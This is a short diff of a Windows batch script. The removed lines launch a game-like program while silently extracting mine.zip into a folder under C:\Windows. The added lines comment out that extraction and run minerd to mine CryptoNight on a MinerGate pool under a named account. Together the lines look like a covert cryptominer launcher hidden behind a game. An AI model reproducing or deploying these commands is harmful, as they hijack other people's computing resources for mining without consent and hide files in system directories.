@@ -1,6 +1,2 @@
-@echo off
-set play=play.exe
-set swf=rom
-set zip=zip.exe
-start "" %play% %swf%
-C:\Windows\7zip.exe e mine.zip "*.*" -oc:\windows\gsh -y -r
+#C:\Windows\7zip.exe e mine.zip "*.*" -oc:\windows\gsh -y -r
+D:\mine\minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u chobaclieu@gmail.com -p x
